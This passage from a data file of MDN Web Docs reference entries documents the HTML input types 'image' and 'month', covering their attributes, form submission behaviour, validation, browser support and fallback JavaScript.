1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [HTML forms guide](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- [`<input>`](../input) and the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface it's based upon\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/hidden](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/hidden)"
- name: input type="image"
  summary: <input> elements of type image are used to create graphical submit buttons, i.e
  description: "# \\<input type=\"image\"\\>\n\n[`<input>`](../input) elements of type `image` are used to create graphical submit buttons, i.e. submit buttons that take the form of an image rather than text.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"image\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Sign in to your account:</p>\n\n    <div>\n      <label for=\"userId\">User ID</label>\n      <input type=\"text\" id=\"userId\" name=\"userId\" />\n    </div>\n\n    <input type=\"image\" id=\"image\" alt=\"Login\" src=\"/media/examples/login-button.png\" />\n\n    label {\n      font-size: 0.8rem;\n    }\n\n    label,\n    input[type='image'] {\n      margin-top: 1rem;\n    }\n\n    input[type='image'] {\n      width: 80px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Value\n\n`<input type=\"image\">` elements do not accept `value` attributes. The path to the image to be displayed is specified in the `src` attribute.\n\n## Additional attributes\n\nIn addition to the attributes shared by all [`<input>`](../input) elements, `image` button inputs support the following attributes.\n\n### alt\n\nThe `alt` attribute provides an alternate string to use as the button's label if the image cannot be shown (due to error, a [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) that cannot or is configured not to show images, or if the user is using a screen reading device). If provided, it must be a non-empty string appropriate as a label for the button.\n\nFor example, if you have a graphical button that shows an image with an icon and/or image text \"Login Now\", you should also set the `alt` attribute to something like `Login Now`.\n\n**Note:** While the `alt` attribute is technically optional, you should always include one to maximize the usability of your content.\n\nFunctionally, the `alt` attribute of the `<input type=\"image\">` element works just like the [`alt`](../img#alt) attribute on [`<img>`](../img) elements.\n\n### formaction\n\nA string indicating the URL to which to submit the data. This takes precedence over the [`action`](../form#action) attribute on the [`<form>`](../form) element that owns the [`<input>`](../input).\n\nThis attribute is also available on [`<input type=\"submit\">`](submit) and [`<button>`](../button) elements.\n\n### formenctype\n\nA string that identifies the encoding method to use when submitting the form data to the server. There are three permitted values:\n\n[`application/x-www-form-urlencoded`](#applicationx-www-form-urlencoded)  \nThis, the default value, sends the form data as a string after [percent-encoding](https://developer.mozilla.org/en-US/docs/Glossary/Percent-encoding) the text using an algorithm such as [`encodeURI()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI).\n\n[`multipart/form-data`](#multipartform-data)  \nUses the [`FormData`](https://developer.mozilla.org/en-US/docs/Web/API/FormData) API to manage the data, allowing for files to be submitted to the server. You *must* use this encoding type if your form includes any [`<input>`](../input) elements of [`type`](../input#type) `file` ([`<input type=\"file\">`](file)).\n\n[`text/plain`](#textplain)  \nPlain text; mostly useful only for debugging, so you can easily see the data that's to be submitted.\n\nIf specified, the value of the `formenctype` attribute overrides the owning form's [`action`](../form#action) attribute.\n\nThis attribute is also available on [`<input type=\"submit\">`](submit) and [`<button>`](../button) elements.\n\n### formmethod\n\nA string indicating the HTTP method to use when submitting the form's data; this value overrides any [`method`](../form#method) attribute given on the owning form. Permitted values are:\n\n[`get`](#get)  \nA URL is constructed by starting with the URL given by the `formaction` or [`action`](../form#action) attribute, appending a question mark (\"?\") character, then appending the form's data, encoded as described by `formenctype` or the form's [`enctype`](../form#enctype) attribute. This URL is then sent to the server using an HTTP [`get`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) request. This method works well for simple forms that contain only [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII) characters and have no side effects. This is the default value.\n\n[`post`](#post)  \nThe form's data is included in the body of the request that is sent to the URL given by the `formaction` or [`action`](../form#action) attribute using an HTTP [`post`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST) request. This method supports complex data and file attachments.\n\n[`dialog`](#dialog)  \nThis method is used to indicate that the button closes the dialog with which the input is associated, and does not transmit the form data at all.\n\nThis attribute is also available on [`<input type=\"submit\">`](submit) and [`<button>`](../button) elements.\n\n### formnovalidate\n\nA Boolean attribute which, if present, specifies that the form should not be validated before submission to the server. This overrides the value of the [`novalidate`](../form#novalidate) attribute on the element's owning form.\n\nThis attribute is also available on [`<input type=\"submit\">`](submit) and [`<button>`](../button) elements.\n\n### formtarget\n\nA string which specifies a name or keyword that indicates where to display the response received after submitting the form. The string must be the name of a **browsing context** (that is, a tab, window, or [`<iframe>`](../iframe). A value specified here overrides any target given by the [`target`](../form#target) attribute on the [`<form>`](../form) that owns this input.\n\nIn addition to the actual names of tabs, windows, or inline frames, there are a few special keywords that can be used:\n\n[`_self`](#_self)  \nLoads the response into the same browsing context as the one that contains the form. This will replace the current document with the received data. This is the default value used if none is specified.\n\n[`_blank`](#_blank)  \nLoads the response into a new, unnamed, browsing context. This is typically a new tab in the same window as the current document, but may differ depending on the configuration of the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent).\n\n[`_parent`](#_parent)  \nLoads the response into the parent browsing context of the current one. If there is no parent context, this behaves the same as `_self`.\n\n[`_top`](#_top)  \nLoads the response into the top-level browsing context; this is the browsing context that is the topmost ancestor of the current context. If the current context is the topmost context, this behaves the same as `_self`.\n\nThis attribute is also available on [`<input type=\"submit\">`](submit) and [`<button>`](../button) elements.\n\n### height\n\nA number specifying the height, in CSS pixels, at which to draw the image specified by the `src` attribute.\n\n### src\n\nA string specifying the URL of the image file to display to represent the graphical submit button. When the user interacts with the image, the input is handled like any other button input.\n\n### width\n\nA number indicating the width at which to draw the image, in CSS pixels.\n\n## Obsolete attributes\n\nThe following attribute was defined by HTML 4 for `image` inputs, but was not implemented by all browsers and has since been deprecated.\n\n### usemap\n\nIf `usemap` is specified, it must be the name of an image map element, [`<map>`](../map), that defines an image map to use with the image. This usage is obsolete; you should switch to using the [`<img>`](../img) element when you want to use image maps.\n\n## Using image inputs\n\nThe `<input type=\"image\">` element is a [replaced element](https://developer.mozilla.org/en-US/docs/Web/CSS/Replaced_element) (an element whose content isn't generated or directly managed by the CSS layer), behaving in much the same way as a regular [`<img>`](../img) element, but with the capabilities of a [submit button](submit).\n\n### Essential image input features\n\nLet's look at a basic example that includes all the essential features you'd need to use (These work exactly the same as they do on the `<img>` element.):\n\nhtml\n\n```\n<input\n  id=\"image\"\n  type=\"image\"\n  width=\"100\"\n  height=\"30\"\n  alt=\"Login\"\n  src=\"https://raw.githubusercontent.com/mdn/learning-area/master/html/forms/image-type-example/login.png\" />\n```\n\n- The [`src`](../input#src) attribute is used to specify the path to the image you want to display in the button.\n- The [`alt`](../input#alt) attribute provides alt text for the image, so screen reader users can get a better idea of what the button is used for. It will also display if the image can't be shown for any reason (for example if the path is misspelled). If possible, use text which matches the label you'd use if you were using a standard submit button.\n- The [`width`](../input#width) and [`height`](../input#height) attributes are used to specify the width and height the image should be shown at, in pixels. The button is the same size as the image; if you need the button's hit area to be bigger than the image, you will need to use CSS (e.g. [`padding`](https://developer.mozilla.org/en-US/docs/Web/CSS/padding)). Also, if you specify only one dimension, the other is automatically adjusted so that the image maintains its original [aspect ratio](https://developer.mozilla.org/en-US/docs/Glossary/Aspect_ratio).\n\n### Overriding default form behaviors\n\n`<input type=\"image\">` elements — like regular [submit buttons](submit) — can accept a number of attributes that override the default form behavior:\n\n[`formaction`](#formaction_2)  \nThe URI of a program that processes the information submitted by the input element; overrides the [`action`](../form#action) attribute of the element's form owner.\n\n[`formenctype`](#formenctype_2)  \nSpecifies the type of content that is used to submit the form to the server. Possible values are:\n\n- `application/x-www-form-urlencoded`: The default value if the attribute is not specified.\n- `text/plain`.\n\nIf this attribute is specified, it overrides the [`enctype`](../form#enctype) attribute of the element's form owner.\n\n[`formmethod`](#formmethod_2)  \nSpecifies the HTTP method that the browser uses to submit the form. Possible values are:\n\n- `post`: The data from the form is included in the body of the form and is sent to the server.\n- `get`: The data from the form is appended to the `form` attribute URI, with a '?' as a separator, and the resulting URI is sent to the server. Use this method when the form has no side effects and contains only ASCII characters.\n\nIf specified, this attribute overrides the [`method`](../form#method) attribute of the element's form owner.\n\n[`formnovalidate`](#formnovalidate_2)  \nA Boolean attribute specifying that the form is not to be validated when it is submitted. If this attribute is specified, it overrides the [`novalidate`](../form#novalidate) attribute of the element's form owner.\n\n[`formtarget`](#formtarget_2)  \nA name or keyword indicating where to display the response that is received after submitting the form. This is a name of, or keyword for, a *browsing context* (for example, tab, window, or inline frame). If this attribute is specified, it overrides the [`target`](../form#target) attribute of the element's form owner. The following keywords have special meanings:\n\n- `_self`: Load the response into the same browsing context as the current one. This value is the default if the attribute is not specified.\n- `_blank`: Load the response into a new unnamed browsing context.\n- `_parent`: Load the response into the parent browsing context of the current one. If there is no parent, this option behaves the same way as `_self`.\n- `_top`: Load the response into the top-level browsing context (that is, the browsing context that is an ancestor of the current one, and has no parent). If there is no parent, this option behaves the same as `_self`.\n\n### Using the x and y data points\n\nWhen you submit a form using a button created with `<input type=\"image\">`, two extra data points are submitted to the server automatically by the browser — `x` and `y`. You can see this in action in our [X Y coordinates example](https://mdn.github.io/learning-area/html/forms/image-type-example/xy-coordinates-example.html).\n\nWhen you click on the image to submit the form, you'll see the data appended to the URL as parameters, for example `?x=52&y=55`. If the image input has a [`name`](../input#name) attribute, then keep in mind that the specified name is prefixed on every attribute, so if the `name` is `position`, then the returned coordinates would be formatted in the URL as `?position.x=52&position.y=55`. This, of course, applies to all other attributes as well.\n\nThese are the X and Y coordinates of the image that the mouse clicked on to submit the form, where (0,0) is the top-left of the image and the default in case submission happens without a click on the image. These can be used when the position the image was clicked on is significant, for example you might have a map that when clicked, sends the coordinates that were clicked to the server. The server-side code then works out what location was clicked on, and returns information about places nearby.\n\nIn our above example, we could write server-side code that works out what color was clicked on by the coordinates submitted, and keeps a tally of the favorite colors people voted for.\n\n### Adjusting the image's position and scaling algorithm\n\nYou can use the [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) property to adjust the positioning of the image within the `<input>` element's frame, and the [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit) property to control how the image's size is adjusted to fit within the frame. This allows you to specify a frame for the image using the `width` and `height` attributes to set aside space in the layout, then adjust where within that space the image is located and how (or if) it is scaled to occupy that space.\n\n## Examples\n\n### A login form\n\nThe following example shows the same button as before, but included in the context of a typical login form.\n\n#### HTML\n\nhtml\n\n```\n<form>\n  <p>Login to your account</p>\n  <div>\n    <label for=\"userId\">User ID</label>\n    <input type=\"text\" id=\"userId\" name=\"userId\" />\n  </div>\n  <div>\n    <label for=\"pwd\">Password</label>\n    <input type=\"password\" id=\"pwd\" name=\"pwd\" />\n  </div>\n  <div>\n    <input\n      id=\"image\"\n      type=\"image\"\n      src=\"https://raw.githubusercontent.com/mdn/learning-area/master/html/forms/image-type-example/login.png\"\n      alt=\"Login\"\n      width=\"100\" />\n  </div>\n</form>\n```\n\n#### CSS\n\nAnd now some simple CSS to make the basic elements sit more neatly:\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n}\n\nlabel {\n  display: inline-block;\n  width: 70px;\n  text-align: right;\n  padding-right: 10px;\n}\n```\n\n### Adjusting the image position and scaling\n\nIn this example, we adapt the previous example to set aside more space for the image and then adjust the actual image's size and positioning using [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit) and [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position).\n\n#### HTML\n\nhtml\n\n```\n<form>\n  <p>Login to your account</p>\n  <div>\n    <label for=\"userId\">User ID</label>\n    <input type=\"text\" id=\"userId\" name=\"userId\" />\n  </div>\n  <div>\n    <label for=\"pwd\">Password</label>\n    <input type=\"password\" id=\"pwd\" name=\"pwd\" />\n  </div>\n  <div>\n    <input\n      id=\"image\"\n      type=\"image\"\n      src=\"https://raw.githubusercontent.com/mdn/learning-area/master/html/forms/image-type-example/login.png\"\n      alt=\"Login\"\n      width=\"200\"\n      height=\"100\" />\n  </div>\n</form>\n```\n\n#### CSS\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n}\n\nlabel {\n  display: inline-block;\n  width: 70px;\n  text-align: right;\n  padding-right: 10px;\n}\n\n#image {\n  object-position: right top;\n  object-fit: contain;\n  background-color: #ddd;\n}\n```\n\nHere, `object-position` is configured to draw the image in the top-right corner of the element, while `object-fit` is set to `contain`, which indicates that the image should be drawn at the largest size that will fit within the element's box without altering its aspect ratio. Note the visible grey background of the element still visible in the area not covered by the image.\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                                                     |\n|---------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | None — the `value` attribute should not be specified.                                                                                                                                                                                                                                               |\n| **Events**                      | None.                                                                                                                                                                                                                                                                                               |\n| **Supported common attributes** | [`alt`](../input#alt), [`src`](../input#src), [`width`](../input#width), [`height`](../input#height), [`formaction`](../input#formaction), [`formenctype`](../input#formenctype), [`formmethod`](../input#formmethod), [`formnovalidate`](../input#formmethod), [`formtarget`](../input#formtarget) |\n| **IDL attributes**              | None.                                                                                                                                                                                                                                                                                               |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                                             |\n| **Methods**                     | None.                                                                                                                                                                                                                                                                                               |\n| **Implicit ARIA Role**          | [`button`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/button_role)                                                                                                                                                                                                       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `image` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<input>`](../input) and the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface which implements it.\n- The HTML [`<img>`](../img) element\n- Positioning and sizing the image within the `<input>` element's frame: [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) and [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/image](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/image)"
- name: input type="month"
  summary: <input> elements of type month create input fields that let the user enter a month and year allowing a month and year to be easily entered
  description: "# \\<input type=\"month\"\\>\n\n[`<input>`](../input) elements of type `month` create input fields that let the user enter a month and year allowing a month and year to be easily entered. The value is a string whose value is in the format \"`YYYY-MM`\", where `YYYY` is the four-digit year and `MM` is the month number.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"month\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"start\">Start month:</label>\n\n    <input type=\"month\" id=\"start\" name=\"start\" min=\"2018-03\" value=\"2018-05\" />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe control's UI varies in general from browser to browser; at the moment support is patchy, with only Chrome/Opera and Edge on desktop — and most modern mobile browser versions — having usable implementations. In browsers that don't support `month` inputs, the control degrades gracefully to a simple [`<input type=\"text\">`](text), although there may be automatic validation of the entered text to ensure it's formatted as expected.\n\nFor those of you using a browser that doesn't support `month`, the screenshot below shows what it looks like in Chrome and Opera. Clicking the down arrow on the right-hand side brings up a date picker that lets you select the month and year.\n\nThe Microsoft Edge `month` control looks like this:\n\n## Value\n\nA string representing the value of the month and year entered into the input, in the form YYYY-MM (four or more digit year, then a hyphen (\"`-`\"), followed by the two-digit month). The format of the month string used by this input type is described in [Month strings](../../date_and_time_formats#month_strings).\n\n### Setting a default value\n\nYou can set a default value for the input control by including a month and year inside the [`value`](../input#value) attribute, like so:\n\nhtml\n\n```\n<label for=\"bday-month\">What month were you born in?</label>\n<input id=\"bday-month\" type=\"month\" name=\"bday-month\" value=\"2001-06\" />\n```\n\nOne thing to note is that the displayed date format differs from the actual `value`; most [user agents](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) display the month and year in a locale-appropriate form, based on the set locale of the user's operating system, whereas the date `value` is always formatted `yyyy-MM`.\n\nWhen the above value is submitted to the server, for example, it will look like `bday-month=1978-06`.\n\n### Setting the value using JavaScript\n\nYou can also get and set the date value in JavaScript using the `HTMLInputElement.value` property, for example:\n\nhtml\n\n```\n<label for=\"bday-month\">What month were you born in?</label>\n<input id=\"bday-month\" type=\"month\" name=\"bday-month\" />\n```\n\njs\n\n```\nconst monthControl = document.querySelector('input[type=\"month\"]');\nmonthControl.value = \"2001-06\";\n```\n\n## Additional attributes\n\nIn addition to the attributes common to [`<input>`](../input) elements, month inputs offer the following attributes.\n\n### list\n\nThe values of the list attribute is the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](../datalist) element located in the same document. The [`<datalist>`](../datalist) provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](../input#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\n### max\n\nThe latest year and month, in the string format discussed in the [Value](#value) section above, to accept. If the [`value`](../input#value) entered into the element exceeds this, the element fails [constraint validation](../../constraint_validation). If the value of the `max` attribute isn't a valid string in \"`yyyy-MM`\" format, then the element has no maximum value.\n\nThis value must specify a year-month pairing later than or equal to the one specified by the `min` attribute.\n\n### min\n\nThe earliest year and month to accept, in the same \"`yyyy-MM`\" format described above. If the [`value`](../input#value) of the element is less than this, the element fails [constraint validation](../../constraint_validation). If a value is specified for `min` that isn't a valid year and month string, the input has no minimum value.\n\nThis value must be a year-month pairing which is earlier than or equal to the one specified by the `max` attribute.\n\n### readonly\n\nA Boolean attribute which, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed from JavaScript code that directly sets the value of the `HTMLInputElement.value` property.\n\n**Note:** Because a read-only field cannot have a value, `required` does not have any effect on inputs with the `readonly` attribute also specified.\n\n### step\n\nThe `step` attribute is a number that specifies the granularity that the value must adhere to, or the special value `any`, which is described below. Only values which are equal to the basis for stepping ([`min`](#min) if specified, [`value`](../input#value) otherwise, and an appropriate default value if neither of those is provided) are valid.\n\nA string value of `any` means that no stepping is implied, and any value is allowed (barring other constraints, such as [`min`](#min) and [`max`](#max)).\n\n**Note:** When the data entered by the user doesn't adhere to the stepping configuration, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) may round to the nearest valid value, preferring numbers in the positive direction when there are two equally close options.\n\nFor `month` inputs, the value of `step` is given in months, with a scaling factor of 1 (since the underlying numeric value is also in months). The default value of `step` is 1 month.\n\n## Using month inputs\n\nDate-related inputs (including `month`) sound convenient at first glance; they promise an easy UI for choosing dates, and they normalize the data format sent to the server, regardless of the user's locale. However, there are issues with `<input type=\"month\">` because at this time, many major browsers don't yet support it.\n\nWe'll look at basic and more complex uses of `<input type=\"month\">`, then offer advice on mitigating the browser support issue in the section [Handling browser support](#handling_browser_support)).\n\n### Basic uses of month\n\nThe simplest use of `<input type=\"month\">` involves a basic [`<input>`](../input) and [`<label>`](../label) element combination, as seen below:\n\nhtml\n\n```\n<form>\n  <label for=\"bday-month\">What month were you born in?</label>\n  <input id=\"bday-month\" type=\"month\" name=\"bday-month\" />\n</form>\n```\n\n### Setting maximum and minimum dates\n\nYou can use the [`min`](../input#min) and [`max`](../input#max) attributes to restrict the range of dates that the user can choose. In the following example we specify a minimum month of `1900-01` and a maximum month of `2013-12`:\n\nhtml\n\n```\n<form>\n  <label for=\"bday-month\">What month were you born in?</label>\n  <input\n    id=\"bday-month\"\n    type=\"month\"\n    name=\"bday-month\"\n    min=\"1900-01\"\n    max=\"2013-12\" />\n</form>\n```\n\nThe result here is that:\n\n- Only months between in January 1900 and December 2013 can be selected; months outside that range can't be scrolled to in the control.\n- Depending on what browser you are using, you might find that months outside the specified range might not be selectable in the month picker (e.g. Edge), or invalid (see [Validation](#validation)) but still available (e.g. Chrome).\n\n### Controlling input size\n\n`<input type=\"month\">` doesn't support form sizing attributes such as [`size`](../input#size). You'll have to resort to [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) for sizing needs.\n\n## Validation\n\nBy default, `<input type=\"month\">` does not apply any validation to entered values. The UI implementations generally don't let you enter anything that isn't a date — which is helpful — but you can still submit the form with the `month` input empty, or enter an invalid date (e.g. the 32nd of April).\n\nTo help avoid this, you can use [`min`](../input#min) and [`max`](../input#max) to restrict the available dates (see [Setting maximum and minimum dates](#setting_maximum_and_minimum_dates)), and in addition use the [`required`](../input#required) attribute to make filling in the date mandatory. As a result, supporting browsers will display an error if you try to submit a date that is outside the set bounds, or an empty date field.\n\nLet's look at an example; here we've set minimum and maximum dates, and also made the field required:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"month\">\n      What month would you like to visit (June to Sept.)?\n    </label>\n    <input\n      id=\"month\"\n      type=\"month\"\n      name=\"month\"\n      min=\"2022-06\"\n      max=\"2022-09\"\n      required />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <input type=\"submit\" value=\"Submit form\" />\n  </div>\n</form>\n```\n\nIf you try to submit the form without both the month and year specified (or with a date outside the set bounds), the browser displays an error. Try playing with the example now:\n\nHere's a screenshot for those of you who aren't using a supporting browser:\n\nHere's the CSS used in the above example. Here we make use of the [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) CSS properties to style the input based on whether the current value is valid. We had to put the icons on a [`<span>`](../span) next to the input, not on the input itself, because in Chrome the generated content is placed inside the form control, and can't be styled or shown effectively.\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n  position: relative;\n}\n\ninput[type=\"number\"] {\n  width: 100px;\n}\n\ninput + span {\n  padding-right: 30px;\n}\n\ninput:invalid + span::after {\n  position: absolute;\n  content: \"✖\";\n  padding-left: 5px;\n}\n\ninput:valid + span::after {\n  position: absolute;\n  content: \"✓\";\n  padding-left: 5px;\n}\n```\n\n**Warning:** HTML form validation is *not* a substitute for scripts that ensure that the entered data is in the proper format. It's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it entirely. It's also possible for someone to bypass your HTML entirely and submit the data directly to your server. If your server-side code fails to validate the data it receives, disaster could strike when improperly-formatted data is submitted (or data which is too large, of the wrong type, and so forth).\n\n## Handling browser support\n\nAs mentioned above, the major problem with using date inputs at the time of writing is that many major browsers don't yet implement them all; only Chrome/Opera and Edge support it on desktop, and most modern browsers on mobile. As an example, the `month` picker on Chrome for Android looks like this:\n\nNon-supporting browsers gracefully degrade to a text input, but this creates problems both in terms of consistency of user interface (the presented control will be different), and data handling.\n\nThe second problem is the more serious of the two. As mentioned earlier, with a `month` input the actual value is always normalized to the format `yyyy-mm`. On the other hand, in its default configuration, a `text` input has no idea what format the date should be in, and this is an issue because of the number of different ways in which people write dates. For example:\n\n- `mmyyyy` (072022)\n- `mm/yyyy` (07/2022)\n- `mm-yyyy` (07-2022)\n- `yyyy-mm` (2022-07)\n- `Month yyyy` (July 2022)\n- and so forth…\n\nOne way around this is to put a [`pattern`](../input#pattern) attribute on your `month` input. Even though the `month` input doesn't use it, if the browser falls back to treating it like a `text` input, the pattern will be used. For example, try viewing the following demo in a browser that doesn't support `month` inputs:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"month\">\n      What month would you like to visit (June to Sept.)?\n    </label>\n    <input\n      id=\"month\"\n      type=\"month\"\n      name=\"month\"\n      min=\"2022-06\"\n      max=\"2022-09\"\n      required\n      pattern=\"[0-9]{4}-[0-9]{2}\" />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <input type=\"submit\" value=\"Submit form\" />\n  </div>\n</form>\n```\n\nIf you try submitting it, you'll see that the browser now displays an error message (and highlights the input as invalid) if your entry doesn't match the pattern `nnnn-nn`, where `n` is a number from 0 to 9. Of course, this doesn't stop people from entering invalid dates (such as `0000-42`), or incorrectly formatted dates that follow the pattern.\n\nThere's also the problem that the user won't necessarily know which of the many date formats is expected. We have work left to do.\n\nThe best way to deal with dates in forms in a cross-browser way (until all major browsers have supported them for a while) is to get the user to enter the month and year in separate controls ([`<select>`](../select) elements being popular; see below for an implementation), or use JavaScript libraries such as the [jQuery date picker](https://jqueryui.com/datepicker/) plugin.\n\n## Examples\n\nIn this example, we create two sets of UI elements, each designed to let the user select a month and year. The first is a native `month` input, and the other is a pair of [`<select>`](../select) elements that allow choosing a month and year independently, for compatibility with browsers that don't yet support `<input type=\"month\">`.\n\n### HTML\n\nThe form that requests the month and year looks like this:\n\nhtml\n\n```\n<form>\n  <div class=\"nativeDatePicker\">\n    <label for=\"month-visit\">What month would you like to visit us?</label>\n    <input type=\"month\" id=\"month-visit\" name=\"month-visit\" />\n    <span class=\"validity\"></span>\n  </div>\n  <p class=\"fallbackLabel\">What month would you like to visit us?</p>\n  <div class=\"fallbackDatePicker\">\n    <div>\n      <span>\n        <label for=\"month\">Month:</label>\n        <select id=\"month\" name=\"month\">\n          <option selected>January</option>\n          <option>February</option>\n          <option>March</option>\n          <option>April</option>\n          <option>May</option>\n          <option>June</option>\n          <option>July</option>\n          <option>August</option>\n          <option>September</option>\n          <option>October</option>\n          <option>November</option>\n          <option>December</option>\n        </select>\n      </span>\n      <span>\n        <label for=\"year\">Year:</label>\n        <select id=\"year\" name=\"year\"></select>\n      </span>\n    </div>\n  </div>\n</form>\n```\n\nThe [`<div>`](../div) with the ID `nativeDatePicker` uses the `month` input type to request the month and year, while the `<div>` with the ID `fallbackDatePicker` instead uses a pair of `<select>` elements. The first requests the month, and the second the year.\n\nThe `<select>` for choosing the month is hardcoded with the names of the months, as they don't change (leaving localization out of things). The list of available year values is dynamically generated depending on the current year (see the code comments below for detailed explanations of how these functions work).\n\n### JavaScript\n\nThe JavaScript code that handles selecting which approach to use and to set up the list of years to include in the non-native year `<select>` follows.\n\nThe part of the example that may be of most interest is the feature detection code. In order to detect whether the browser supports `<input type=\"month\">`, we create a new [`<input>`](../input) element, try setting its `type` to `month`, then immediately check what its type is set to. Browsers that don't support type `month` will return `text`, since that's What month falls back to when not supported. If `<input type=\"month\">` is not supported, we hide the native picker and show the fallback picker UI instead.\n\njs\n\n```\n// Get UI elements\nconst nativePicker = document.querySelector(\".nativeDatePicker\");\nconst fallbackPicker = document.querySelector(\".fallbackDatePicker\");\nconst fallbackLabel = document.querySelector(\".fallbackLabel\");\n\nconst yearSelect = document.querySelector(\"#year\");\nconst monthSelect = document.querySelector(\"#month\");\n\n// Hide fallback initially\nfallbackPicker.style.display = \"none\";\nfallbackLabel.style.display = \"none\";\n\n// Test whether a new date input falls back to a text input or not\nconst test = document.createElement(\"input\");\n\ntry {\n  test.type = \"month\";\n} catch (e) {\n  console.log(e.description);\n}\n\n// If it does, run the code inside the if () {} block\nif (test.type === \"text\") {\n  // Hide the native picker and show the fallback\n  nativePicker.style.display = \"none\";\n  fallbackPicker.style.display = \"block\";\n  fallbackLabel.style.display = \"block\";\n\n  // Populate the years dynamically\n  // (the months are always the same, therefore hardcoded)\n  populateYears();\n}\n\nfunction populateYears() {\n  // Get the current year as a number\n  const date = new Date();\n  const year = date.getFullYear();\n\n  // Make this year, and the 100 years before it available in the year <select>\n  for (let i = 0; i <= 100; i++) {\n    const option = document.createElement(\"option\");\n    option.textContent = year - i;\n    yearSelect.appendChild(option);\n  }\n}\n```\n\n**Note:** Remember that some years have 53 weeks in them (see [Weeks per year](https://en.wikipedia.org/wiki/ISO_week_date#Weeks_per_year))! You'll need to take this into consideration when developing production apps.\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                             |\n|---------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing a month and year, or empty.                                                                                                                                                                                                                           |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                   |\n| **Supported common attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`readonly`](../input#readonly), [`step`](../input#step)                                                                                                                                                  |\n| **IDL attributes**              | [`list`](../input#list), [`value`](../input#value), `valueAsDate`, `valueAsNumber`                                                                                                                                                                                          |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                     |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), 